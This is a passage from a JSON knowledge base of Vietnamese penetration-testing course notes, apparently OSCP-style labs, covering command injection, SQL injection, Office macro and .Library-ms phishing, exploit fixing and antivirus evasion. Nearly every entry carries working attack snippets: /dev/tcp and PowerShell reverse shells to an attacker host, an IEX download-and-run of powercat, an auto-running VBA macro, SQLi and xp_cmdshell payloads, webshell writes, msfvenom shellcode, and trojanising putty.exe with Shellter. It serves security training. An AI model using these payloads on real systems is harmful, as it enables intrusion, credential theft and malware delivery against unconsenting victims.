        "language": "bash",
        "command": "bash -c 'bash -i >& /dev/tcp/<kali_ip>/4444 0>&1'"
      },
      {
        "language": "bash",
        "command": "sudo su"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "command_injection_lab3_linux",
    "category": "Common WebApp Attack",
    "title": "Command Injection - LAB 3 Linux",
    "content": "Phát hiện lỗ hổng OS Command Injection trong trường nhập 'ffa'. Sử dụng payload `\"|id;#` để thoát khỏi chuỗi và thực thi lệnh. Dấu `\"` để đóng chuỗi, `|` để nối lệnh, và `#` để vô hiệu hóa phần còn lại của lệnh gốc. Chèn payload reverse shell `bash -i` để có được shell. Sử dụng `sudo su` để leo thang đặc quyền.",
    "tags": [
      "lab",
      "command_injection",
      "linux",
      "bash",
      "reverse_shell",
      "payload",
      "sudo_su",
      "privesc"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "\"|id;#"
      },
      {
        "language": "bash",
        "command": "bash -i >& /dev/tcp/<kali_ip>/4444 0>&1"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "command_injection_lab4_windows",
    "category": "Common WebApp Attack",
    "title": "Command Injection - LAB 4 Windows (File Upload to RCE)",
    "content": "Scan Nmap thấy cổng 80 (IIS) và 8000. Cổng 8000 có chức năng tải lên tệp. Tải lên một tệp webshell ASPX (cmdasp.aspx). Truy cập tệp webshell qua cổng 80 (http://192.168.161.16/cmdasp.aspx) để thực thi lệnh. Sử dụng webshell để thực thi payload reverse shell PowerShell (-e).",
    "tags": [
      "lab",
      "command_injection",
      "rce",
      "windows",
      "file_upload",
      "webshell",
      "aspx",
      "iis",
      "nmap",
      "powershell",
      "reverse_shell"
    ],
    "code_snippets": [
      {
        "language": "http",
        "command": "http://<target_ip>/cmdasp.aspx"
      },
      {
        "language": "powershell",
        "command": "powershell -e "
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  
  {
    "id": "sqli_theory_connection",
    "category": "SQL Injection",
    "title": "SQL Injection Theory: Database Connection",
    "content": "Cách kết nối đến cơ sở dữ liệu MySQL trên Linux (sử dụng mysql client) và MS-SQL trên Windows (sử dụng impacket-mssqlclient với Windows authentication).",
    "tags": [
      "theory",
      "sqli",
      "mysql",
      "mssql",
      "linux",
      "windows",
      "impacket-mssqlclient"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "mysql -u root -p -h <target_ip> -P 3306"
      },
      {
        "language": "bash",
        "command": "impacket-mssqlclient <user-windows>:<pass>@<target_ip> -windows-auth"
      }
    ],
    "related_cves": [],
    "source_file": "5-SQLi.md"
  },
  {
    "id": "sqli_theory_types",
    "category": "SQL Injection",
    "title": "SQL Injection Theory: Attack Types",
    "content": "Có 3 loại tấn công SQL Injection chính: Error-based (dựa trên lỗi), UNION-based (dựa trên toán tử UNION), và Blind (SQLi mù), bao gồm Boolean-based (dựa trên kết quả TRUE/FALSE) và Time-based (dựa trên thời gian trễ).",
    "tags": [
      "theory",
      "sqli",
      "error_based",
      "union_based",
      "blind_sqli",
      "boolean_based",
      "time_based"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "5-SQLi.md"
  },
  {
    "id": "sqli_error_based_examples",
    "category": "SQL Injection",
    "title": "SQL Injection: Error-based Examples",
    "content": "Ví dụ về các payload SQL injection dựa trên lỗi.",
    "tags": [
      "sqli",
      "error_based",
      "payload",
      "example"
    ],
    "code_snippets": [
      {
        "language": "sql",
        "command": "offsec' or 1=1 -- //"
      },
      {
        "language": "sql",
        "command": "offsec' or 1=1 in (select * from users where username = 'admin') -- //"
      }
    ],
    "related_cves": [],
    "source_file": "5-SQLi.md"
  },
  {
    "id": "sqli_union_based_technique",
    "category": "SQL Injection",
    "title": "SQL Injection: UNION-based Technique",
    "content": "Để tấn công UNION-based, cần thỏa mãn 2 điều kiện: cùng số lượng cột và kiểu dữ liệu tương thích. Bước 1: Dùng `' ORDER BY 1-- //` (tăng dần số) để tìm số cột. Bước 2: Dùng `%' UNION SELECT 'a1','a2','a3','a4','a5' -- //` để tìm cột được hiển thị. Bước 3: Trích xuất thông tin (database(), user(), @@version, information_schema.columns).",
    "tags": [
      "sqli",
      "union_based",
      "payload",
      "technique",
      "order_by",
      "information_schema"
    ],
    "code_snippets": [
      {
        "language": "sql",
        "command": "' ORDER BY 1-- //"
      },
      {
        "language": "sql",
        "command": "%' UNION SELECT 'a1','a2','a3','a4','a5' -- //"
      },
      {
        "language": "sql",
        "command": "%' UNION SELECT database(), user(), @@version, null, null -- //"
      },
      {
        "language": "sql",
        "command": "' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //"
      }
    ],
    "related_cves": [],
    "source_file": "5-SQLi.md"
  },
  {
    "id": "sqli_blind_technique",
    "category": "SQL Injection",
    "title": "SQL Injection: Blind SQLi (Boolean/Time-based)",
    "content": "Boolean-based: Khiến ứng dụng trả về các giá trị TRUE/FALSE có thể dự đoán. Time-based: Sử dụng hàm `sleep()` để suy ra kết quả dựa trên thời gian phản hồi. Với Blind SQLi, đầu ra không đến từ CSDL mà từ hành vi của ứng dụng web.",
    "tags": [
      "sqli",
      "blind_sqli",
      "boolean_based",
      "time_based",
      "technique",
      "sleep"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "5-SQLi.md"
  },
  {
    "id": "sqli_rce_manual",
    "category": "SQL Injection",
    "title": "SQLi: Manual Code Execution (RCE)",
    "content": "Thực thi mã thủ công qua SQLi. Trên Windows (MS-SQL): Dùng `impacket-mssqlclient` để bật `enable_xp_cmdshell` và thực thi lệnh qua `xp_cmdshell`. Trên Linux (MySQL): Dùng `INTO OUTFILE` để ghi một webshell ra máy chủ.",
    "tags": [
      "sqli",
      "rce",
      "manual_exploitation",
      "mssql",
      "xp_cmdshell",
      "mysql",
      "into_outfile",
      "webshell",
      "windows",
      "linux",
      "impacket-mssqlclient"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "impacket-mssqlclient <user-windows>:<pass>@<target_ip> -windows-auth"
      },
      {
        "language": "sql",
        "command": "enable_xp_cmdshell"
      },
      {
        "language": "sql",
        "command": "xp_cmdshell 'whoami'"
      },
      {
        "language": "sql",
        "command": "offsec' AND 1=1 UNION SELECT 'php system function' INTO OUTFILE '/var/www/html/shell.php' -- //"
      }
    ],
    "related_cves": [],
    "source_file": "5-SQLi.md"
  },
  {
    "id": "sqli_rce_sqlmap",
    "category": "SQL Injection",
    "title": "SQLi: Automated Code Execution (sqlmap)",
    "content": "Sử dụng sqlmap để tự động khai thác và lấy shell hệ thống với cờ `--os-shell`.",
    "tags": [
      "sqli",
      "rce",
      "automated_exploitation",
      "sqlmap",
      "tool",
      "os_shell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sqlmap -r post.txt -p item  --os-shell  --web-root \"/var/www/html/tmp\""
      }
    ],
    "related_cves": [],
    "source_file": "5-SQLi.md"
  },
  {
    "id": "sqli_lab_capstone4_wordpress",
    "category": "SQL Injection",
    "title": "LAB Capstone 4 - WordPress SQLi (CVE-2021-24762)",
    "content": "Website WordPress 6.0. Sử dụng `wpscan` để quét plugin và phát hiện `perfect-survey` có lỗ hổng SQLi (CVE-2021-24762). Khai thác UNION-based qua `admin-ajax.php` để lấy hash mật khẩu của admin. Crack hash (mật khẩu: 'hulabaloo'), đăng nhập vào wp-admin, tải lên và kích hoạt plugin Reverse Shell để lấy cờ.",
    "tags": [
      "lab",
      "capstone",
      "sqli",
      "wordpress",
      "plugin",
      "wpscan",
      "cve",
      "union_based",
      "hash_cracking",
      "reverse_shell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "wpscan --url http://<target_domain>/ --enumerate vp --api-token <Your api key>"
      },
      {
        "language": "http",
        "command": "http://<target_domain>/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users"
      }
    ],
    "related_cves": [
      "CVE-2021-24762"
    ],
    "source_file": "5-SQLi.md"
  },
  {
    "id": "sqli_lab_capstone5_sqlmap",
    "category": "SQL Injection",
    "title": "LAB Capstone 5 - sqlmap (mail-list)",
    "content": "Sử dụng Burp Suite để chặn request (tham số `mail-list`). Lưu request vào tệp và dùng `sqlmap` (level 5, risk 3) với cờ `--os-shell` để khai thác.",
    "tags": [
      "lab",
      "capstone",
      "sqli",
      "sqlmap",
      "tool",
      "burpsuite",
      "os_shell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sqlmap -r testSQLi-1 -p mail-list --level=5 --risk=3 --os-shell"
      }
    ],
    "related_cves": [],
    "source_file": "5-SQLi.md"
  },
  {
    "id": "sqli_lab_capstone6_sqlmap",
    "category": "SQL Injection",
    "title": "LAB Capstone 6 - sqlmap (height)",
    "content": "Sử dụng Burp Suite để chặn request (tham số `height`). Lưu request vào tệp và dùng `sqlmap` (level 5, risk 3) với cờ `--os-shell` để khai thác.",
    "tags": [
      "lab",
      "capstone",
      "sqli",
      "sqlmap",
      "tool",
      "burpsuite",
      "os_shell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sqlmap -r testSQLi-1 -p height --level=5 --risk=3 --os-shell"
      }
    ],
    "related_cves": [],
    "source_file": "5-SQLi.md"
  },
  {
    "id": "sqli_lab_capstone7_mssql_timebased",
    "category": "SQL Injection",
    "title": "LAB Capstone 7 - MS-SQL Time-based RCE",
    "content": "Phát hiện SQLi Time-based trên MS SQL Server ở trường `username`. Xác nhận bằng `WAITFOR DELAY '0:0:5'`. Khai thác RCE bằng cách sử dụng `exec master..xp_cmdshell` để chạy payload reverse shell PowerShell đã mã hóa base64.",
    "tags": [
      "lab",
      "capstone",
      "sqli",
      "time_based",
      "mssql",
      "windows",
      "xp_cmdshell",
      "rce",
      "powershell",
      "reverse_shell",
      "burpsuite",
      "base64"
    ],
    "code_snippets": [
      {
        "language": "sql",
        "command": "admin' ; IF 1=1 WAITFOR DELAY '0:0:5' --"
      },
      {
        "language": "sql",
        "command": "admin'; exec master..xp_cmdshell 'whoami'--"
      },
      {
        "language": "sql",
        "command": "admin'; exec master..xp_cmdshell 'powershell -e <base64_encoded_powershell_reverse_shell>'--"
      }
    ],
    "related_cves": [],
    "source_file": "5-SQLi.md"
  },
  {
    "id": "clientside_recon_exiftool",
    "category": "Client-Side Attacks",
    "title": "Target Reconnaissance: exiftool",
    "content": "Sử dụng `exiftool` để trích xuất metadata từ tệp. Thông tin quan trọng bao gồm ngày tạo/sửa, tác giả, hệ điều hành và ứng dụng đã dùng để tạo tệp.",
    "tags": [
      "recon",
      "client_side",
      "exiftool",
      "metadata",
      "osint"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "exiftool -a -u test.pdf"
      }
    ],
    "related_cves": [],
    "source_file": "6-Client-Side Attacks.md"
  },
  {
    "id": "clientside_recon_fingerprinting",
    "category": "Client-Side Attacks",
    "title": "Target Reconnaissance: Client Fingerprinting",
    "content": "Sử dụng kỹ thuật browser fingerprinting (lấy dấu vân tay trình duyệt) để xác định trình duyệt và hệ điều hành của client.",
    "tags": [
      "recon",
      "client_side",
      "fingerprinting",
      "browser"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "6-Client-Side Attacks.md"
  },
  {
    "id": "clientside_msoffice_macro",
    "category": "Client-Side Attacks",
    "title": "Exploiting Microsoft Office: Macro Attack",
    "content": "Tệp chứa macro nên được tạo với đuôi .doc hoặc .docm (không phải .docx). Tạo macro trong Word (View -> Macros). Sử dụng `AutoOpen()` hoặc `Document_Open()` để macro tự động chạy khi tệp được mở. Macro VBA có thể sử dụng `CreateObject(\"Wscript.Shell\").Run` để thực thi một lệnh, ví dụ như payload reverse shell PowerShell đã mã hóa base64.",
    "tags": [
      "client_side",
      "msoffice",
      "macro",
      "vba",
      "phishing",
      "reverse_shell",
      "powershell",
      "doc",
      "docm",
      "AutoOpen",
      "base64",
      "wscript.shell"
    ],
    "code_snippets": [
      {
        "language": "vba",
        "command": "Sub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\nSub MyMacro()\n    Dim Str As String\n    Str = Str + \"powershell -e <base64_encoded_powershell_reverse_shell_to_kali_ip>\"\n\n    CreateObject(\"Wscript.Shell\").Run Str\nEnd Sub"
      }
    ],
    "related_cves": [],
    "source_file": "6-Client-Side Attacks.md"
  },
  {
    "id": "clientside_lab_msoffice_macro",
    "category": "Client-Side Attacks",
    "title": "LAB MS Office: Macro Reverse Shell",
    "content": "Sử dụng `xfreerdp3` để kết nối đến máy Windows và chia sẻ tệp (`/drive:shared`). Tạo một tệp Word `.doc` chứa macro reverse shell. Sao chép tệp này vào thư mục chia sẻ (`//tserver/shared/`) và đổi tên thành `ticket.doc`. Mở trình nghe `nc -lvnp 4444` trên Kali. Tải tệp `ticket.doc` lên trang web. Chờ 3 phút để macro được thực thi và nhận reverse shell.",
    "tags": [
      "lab",
      "client_side",
      "msoffice",
      "macro",
      "vba",
      "reverse_shell",
      "xfreerdp3",
      "file_sharing",
      "nc",
      "windows"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "xfreerdp3 /u:offsec /p:lab /v:<target_ip> /drive:shared,/home/kali/Desktop/"
      },
      {
        "language": "powershell",
        "command": "copy MyMacro.doc //tserver/shared/"
      },
      {
        "language": "bash",
        "command": "nc -lvnp 4444"
      }
    ],
    "related_cves": [],
    "source_file": "6-Client-Side Attacks.md"
  },
  {
    "id": "clientside_windows_libraries_theory",
    "category": "Client-Side Attacks",
    "title": "Abusing Windows Libraries File (.Library-ms)",
    "content": "Kịch bản tấn công: 1. Tạo máy chủ WebDAV trên Linux (cài `python3-wsgidav`, chạy `wsgidav` với --auth anonymous). 2. Tạo tệp `config.Library-ms` (XML) trỏ đến URL của máy chủ WebDAV. 3. Tạo tệp shortcut `auto-config.lnk` chứa payload (ví dụ: tải và chạy powercat). 4. Khi người dùng chạy tệp `.Library-ms`, Windows sẽ kết nối đến WebDAV. Chạy tệp `.lnk` sẽ kích hoạt reverse shell.",
    "tags": [
      "client_side",
      "windows",
      "library_file",
      "library-ms",
      "lnk",
      "shortcut",
      "webdav",
      "wsgidav",
      "powercat",
      "reverse_shell",
      "phishing"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "apt install python3-wsgidav"
      },
      {
        "language": "bash",
        "command": "wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r /home/kali/Desktop/webdav"
      },
      {
        "language": "xml",
        "command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\">\n...\n<simpleLocation>\n<url>http://<kali_ip></url>\n</simpleLocation>\n...\n</libraryDescription>"
      },
      {
        "language": "powershell",
        "command": "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>:8000/powercat.ps1');powercat -c <kali_ip> -p 4444 -e powershell\""
      }
    ],
    "related_cves": [],
    "source_file": "6-Client-Side Attacks.md"
  },
  {
    "id": "clientside_lab_windows_libraries_01",
    "category": "Client-Side Attacks",
    "title": "LAB Windows Libraries File 01",
    "content": "Tiếp tục kịch bản lạm dụng tệp Windows Libraries. Sử dụng `smbclient` để tải tệp `config.Library-ms` đã tạo lên một SMB share của mục tiêu. Khi tệp được kích hoạt, nó sẽ kết nối đến WebDAV server (được ngụ ý là host tệp .lnk độc hại) và dẫn đến reverse shell.",
    "tags": [
      "lab",
      "client_side",
      "windows",
      "library_file",
      "library-ms",
      "webdav",
      "smbclient",
      "reverse_shell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "smbclient //<target_ip>/share -c 'put config.Library-ms'"
      }
    ],
    "related_cves": [],
    "source_file": "6-Client-Side Attacks.md"
  },
  {
    "id": "exploit_resources_online",
    "category": "Locating Public Exploits",
    "title": "Online Exploit Resources",
    "content": "Các nguồn tài nguyên trực tuyến để tìm kiếm exploit công khai bao gồm: The Exploit Database (ExploitDB), Packet Storm, Github, và sử dụng các toán tử tìm kiếm của Google (Google Search Operator).",
    "tags": [
      "exploit",
      "recon",
      "resource",
      "online",
      "exploitdb",
      "packet_storm",
      "github",
      "google_dorks"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "7-Locating Public Exploits.md"
  },
  {
    "id": "exploit_resources_offline",
    "category": "Locating Public Exploits",
    "title": "Offline Exploit Resources",
    "content": "Các nguồn tài nguyên ngoại tuyến (có sẵn trên máy) để tìm kiếm exploit bao gồm: Metasploit, Searchsploit (bản offline của ExploitDB), và các Nmap NSE Scripts.",
    "tags": [
      "exploit",
      "recon",
      "resource",
      "offline",
      "metasploit",
      "searchsploit",
      "nmap",
      "nse"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "7-Locating Public Exploits.md"
  },
  {
    "id": "phishing_techniques_list",
    "category": "Phishing Basics",
    "title": "Some of Phishing Techniques",
    "content": "Liệt kê các kỹ thuật lừa đảo (phishing) phổ biến, bao gồm: Email Phishing, Spear Phishing (lừa đảo có chủ đích), Whaling (lừa đảo nhắm vào mục tiêu cấp cao), Smishing (qua SMS), Vishing (qua giọng nói/cuộc gọi), và Chat Phishing.",
    "tags": [
      "theory",
      "phishing",
      "techniques",
      "email_phishing",
      "spear_phishing",
      "whaling",
      "smishing",
      "vishing"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "8-Phishing Basics.md"
  },
  {
    "id": "phishing_credential_cloning",
    "category": "Phishing Basics",
    "title": "Hands-On Credential Phishing: Cloning Website",
    "content": "Sử dụng `wget` để sao chép (clone) một trang web hợp pháp (ví dụ: trang đăng nhập Zoom) về máy local để chuẩn bị cho cuộc tấn công lừa đảo.",
    "tags": [
      "phishing",
      "credential_phishing",
      "cloning",
      "wget",
      "tool"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "wget -E -k -K -p -e robots=off -H -D<target_domain> -nd \"https://<target_domain>/signin#/login\""
      }
    ],
    "related_cves": [],
    "source_file": "8-Phishing Basics.md"
  },
  {
    "id": "phishing_credential_steps",
    "category": "Phishing Basics",
    "title": "Hands-On Credential Phishing: Process",
    "content": "Các bước thực hiện một cuộc tấn công lừa đảo lấy thông tin xác thực: Chuẩn bị email mồi (pretext), sao chép trang web, dọn dẹp mã nguồn (có thể dùng LLM), chèn mã độc (để lấy cắp thông tin), và tạo email lừa đảo.",
    "tags": [
      "phishing",
      "credential_phishing",
      "process",
      "cloning",
      "injection"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "8-Phishing Basics.md"
  },
  {
    "id": "fix_exploit_memory_corruption_compile",
    "category": "Fixing Exploits",
    "title": "Fixing Memory Corruption: Cross-Compiling",
    "content": "Tìm hiểu về Buffer Overflows. Sử dụng `mingw-w64` để biên dịch chéo (cross-compile) mã exploit (viết bằng C) thành tệp thực thi Windows (PE). Cần cài đặt `mingw-w64` và sử dụng `i686-w64-mingw32-gcc` để biên dịch.",
    "tags": [
      "exploit_dev",
      "fixing_exploits",
      "memory_corruption",
      "buffer_overflow",
      "cross_compile",
      "mingw-w64",
      "windows",
      "linux"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo apt install mingw-w64"
      },
      {
        "language": "bash",
        "command": "i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32"
      }
    ],
    "related_cves": [],
    "source_file": "9-Fixing Exploits.md"
  },
  {
    "id": "fix_exploit_memory_corruption_payload",
    "category": "Fixing Exploits",
    "title": "Fixing Memory Corruption: Payload Generation",
    "content": "Sử dụng `msfvenom` để tạo payload (ví dụ: windows/shell_reverse_tcp) với định dạng C (-f c), encoder (-e x86/shikata_ga_nai) và loại bỏ các ký tự xấu (-b \"\\x00\\x0a...\"). Sửa payload để hoạt động với mục tiêu. Có thể dùng `wine` để chạy tệp .exe trên Kali.",
    "tags": [
      "exploit_dev",
      "fixing_exploits",
      "memory_corruption",
      "msfvenom",
      "payload_generation",
      "shellcode",
      "shikata_ga_nai",
      "bad_chars",
      "wine"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d\""
      },
      {
        "language": "bash",
        "command": "sudo wine syncbreeze_exploit.exe"
      }
    ],
    "related_cves": [],
    "source_file": "9-Fixing Exploits.md"
  },
  {
    "id": "fix_exploit_web_searchsploit",
    "category": "Fixing Exploits",
    "title": "Fixing Web Exploits: Searchsploit",
    "content": "Sử dụng `searchsploit` để tìm các exploit RCE (Remote Code Execution) có sẵn cho các framework web mục tiêu như cms, elfinder, joomla, wordpress. Sử dụng `searchsploit -m` để sao chép (mirror) mã exploit về thư mục hiện tại và sửa đổi nó cho phù hợp với mục tiêu.",
    "tags": [
      "exploit_dev",
      "fixing_exploits",
      "web_exploit",
      "searchsploit",
      "rce",
      "cms",
      "elfinder",
      "joomla",
      "wordpress"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "searchsploit CMS Made Simple"
      },
      {
        "language": "bash",
        "command": "searchsploit -m 1234.py"
      },
      {
        "language": "bash",
        "command": "python2 1234.py"
      }
    ],
    "related_cves": [],
    "source_file": "9-Fixing Exploits.md"
  },
  {
    "id": "fix_exploit_lab_capstone02_cmsms",
    "category": "Fixing Exploits",
    "title": "LAB Capstone 02: Fixing CMS Made Simple Exploit (44976.py)",
    "content": "Sử dụng `searchsploit` để tìm và lấy exploit `44976.py` cho CMS Made Simple. Sửa đổi mã exploit (base_url, username, password, csrf_param) cho phù hợp với mục tiêu. Chạy exploit bằng `python2` để tải lên `shell.php`. Truy cập webshell bằng `curl` để thực thi lệnh và lấy cờ.",
    "tags": [
      "lab",
      "capstone",
      "fixing_exploits",
      "web_exploit",
      "searchsploit",
      "python2",
      "cms_made_simple",
      "webshell",
      "curl"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "searchsploit -m 44976.py"
      },
      {
        "language": "python",
        "command": "base_url = \"http://<target_ip>/cmsms/admin\"\nusername = \"offsec\"\npassword = \"lFEZK1vMpzeyZ71e8kRRqXrFAs9X16iJ\"\ncsrf_param = \"_sk_\""
      },
      {
        "language": "bash",
        "command": "python2 44976.py"
      },
      {
        "language": "bash",
        "command": "curl -k https://<target_ip>/uploads/shell.php?cmd=cat%20/home/offsec/flag.txt"
      }
    ],
    "related_cves": [],
    "source_file": "9-Fixing Exploits.md"
  },
  {
    "id": "fix_exploit_lab_capstone03_elfinder",
    "category": "Fixing Exploits",
    "title": "LAB Capstone 03: Fixing Elfinder Exploit (46481.py)",
    "content": "Sử dụng `gobuster` để tìm thư mục `/seclab/`. Sử dụng `searchsploit` để tìm và lấy exploit `46481.py` cho Elfinder. Tải về một ảnh `SecSignal.jpg` (vì exploit yêu cầu). Chạy exploit `python2 46481.py`, nhập URL mục tiêu (`http://192.168.135.55/seclab/`) để lấy shell và cờ.",
    "tags": [
      "lab",
      "capstone",
      "fixing_exploits",
      "web_exploit",
      "gobuster",
      "searchsploit",
      "python2",
      "elfinder",
      "webshell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
      },
      {
        "language": "bash",
        "command": "searchsploit -m 46481.py"
      },
      {
        "language": "bash",
        "command": "python2 46481.py"
      }
    ],
    "related_cves": [],
    "source_file": "9-Fixing Exploits.md"
  },
  {
    "id": "av_theory_components",
    "category": "AV Evasion",
    "title": "About Antivirus: Theory and Components",
    "content": "Antivirus (AV) được thiết kế để phát hiện, ngăn chặn và loại bỏ phần mềm độc hại. Các thành phần AV hiện đại bao gồm: File Engine, Memory Engine, Network Engine, Disassembler, Emulator/Sandbox, Browser Plugin, và Machine Learning Engine.",
    "tags": [
      "theory",
      "av",
      "antivirus",
      "components",
      "sandbox",
      "machine_learning"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "10-AV Evasion.md"
  },
  {
    "id": "av_theory_detection",
    "category": "AV Evasion",
    "title": "About Antivirus: Detection Methodologies",
    "content": "Các phương pháp phát hiện AV: Signature-based (dựa trên chữ ký đã biết), Heuristic-based (dựa trên quy tắc/thuật toán), Behavior-based (phân tích hành vi), và Machine learning-based (phân tích siêu dữ liệu).",
    "tags": [
      "theory",
      "av",
      "antivirus",
      "detection",
      "signature_based",
      "heuristic_based",
      "behavior_based"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "10-AV Evasion.md"
  },
  {
    "id": "av_pe_file_msfvenom",
    "category": "AV Evasion",
    "title": "PE File and AV Detection",
    "content": "Tệp PE (Portable Executable) được dùng để thực thi mã độc trên Windows. Sử dụng `msfvenom` để tạo payload .exe (ví dụ: windows/shell_reverse_tcp). Có thể dùng các dịch vụ như `VirusTotal` hoặc `AntiScan.Me` để kiểm tra xem tệp có bị AV phát hiện hay không.",
    "tags": [
      "av",
      "pe_file",
      "windows",
      "msfvenom",
      "payload_generation",
      "virustotal",
      "antiscan.me"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe > binary.exe"
      }
    ],
    "related_cves": [],
    "source_file": "10-AV Evasion.md"
  },
  {
    "id": "av_evasion_techniques",
    "category": "AV Evasion",
    "title": "Bypassing Antivirus Detection: Techniques",
    "content": "Kỹ thuật né tránh AV trên đĩa (On-disk Evasion): sử dụng định dạng tệp khác, làm rối mã (obfuscation), đóng gói (packing), mã hóa (encryption). Kỹ thuật né tránh trong bộ nhớ (On-memory Evasion): sử dụng tiến trình khác để thực thi mã, sử dụng PowerShell và Windows API (Remote Process Memory Injection).",
    "tags": [
      "theory",
      "av_evasion",
      "on_disk",
      "on_memory",
      "obfuscation",
      "packing",
      "encryption",
      "process_injection",
      "powershell",
      "windows_api"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "10-AV Evasion.md"
  },
  {
    "id": "av_evasion_manual_powershell",
    "category": "AV Evasion",
    "title": "AV Evasion in Practice: Manual (Thread Injection)",
    "content": "Viết script PowerShell để thực thi mã độc (Thread Injection). Sử dụng `msfvenom` để tạo payload PowerShell (-f powershell -v sc). Đổi tên biến ($sc, $winFunc...) để né AV. Trên máy mục tiêu, chạy script (có thể cần `Set-ExecutionPolicy Unrestricted`). Mở trình nghe `nc` trên Kali để nhận reverse shell.",
    "tags": [
      "av_evasion",
      "manual_evasion",
      "thread_injection",
      "powershell",
      "msfvenom",
      "payload_generation",
      "set_executionpolicy",
      "nc",
      "reverse_shell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f powershell -v sc"
      },
      {
        "language": "powershell",
        "command": ".\\bypass.ps1"
      },
      {
        "language": "powershell",
        "command": "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser"
      },
      {
        "language": "bash",
        "command": "nc -lvnp 4444"
      }
    ],
    "related_cves": [],
    "source_file": "10-AV Evasion.md"
  },
  {
    "id": "av_evasion_shellter_install",
    "category": "AV Evasion",
    "title": "AV Evasion in Practice: Shellter (Install)",
    "content": "Cài đặt Shellter: `sudo apt install shellter`. Vì Shellter là ứng dụng Windows, cần cài `wine` (bao gồm cả `wine32`) để chạy trên Kali. Chạy bằng lệnh `shellter`.",
    "tags": [
      "av_evasion",
      "tool",
      "shellter",
      "install",
      "wine",
      "wine32",
      "linux"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo apt install shellter"
      },
      {
        "language": "bash",
        "command": "sudo apt install wine"
      },
      {
        "language": "bash",
        "command": "sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32"
      }
    ],
    "related_cves": [],
    "source_file": "10-AV Evasion.md"
  },
  {
    "id": "av_evasion_shellter_usage",
    "category": "AV Evasion",
    "title": "AV Evasion in Practice: Shellter (Usage)",
    "content": "Chạy Shellter: Chọn chế độ Auto (A), chọn tệp PE mục tiêu (spotify.exe), bật Stealth Mode (Y), chọn payload từ danh sách (L), ví dụ Meterpreter/Reverse_TCP. Đặt LHOST và LPORT. Shellter sẽ tiêm payload vào tệp PE. Sử dụng `msfconsole` (exploit/multi/handler) để bắt reverse shell khi tệp được thực thi.",
    "tags": [
      "av_evasion",
      "tool",
      "shellter",
      "usage",
      "pe_injection",
      "stealth_mode",
      "meterpreter",
      "reverse_tcp",
      "msfconsole",
      "multi_handler"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "shellter"
      },
      {
        "language": "bash",
        "command": "msfconsole -x \"use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <kali_ip>;set LPORT 443;run;\""
      }
    ],
    "related_cves": [],
    "source_file": "10-AV Evasion.md"
  },
  {
    "id": "av_evasion_lab_capstone02_shellter",
    "category": "AV Evasion",
    "title": "LAB Capstone 02: AV Evasion with Shellter (Putty)",
    "content": "Tải `Putty.exe`. Dùng Shellter để tiêm payload Meterpreter/Reverse_TCP (LHOST 192.168.45.211, LPORT 4444) vào Putty.exe. Đăng nhập vào máy chủ FTP của mục tiêu bằng anonymous login (`ftp -A 192.168.135.36`). Chuyển sang chế độ binary (`bin`) và tải lên tệp `putty.exe` (`put putty.exe`). Mở `msfconsole` với `multi/handler` để nhận reverse shell khi tệp được thực thi.",
    "tags": [
      "lab",
      "capstone",
      "av_evasion",
      "shellter",
      "putty",
      "ftp",
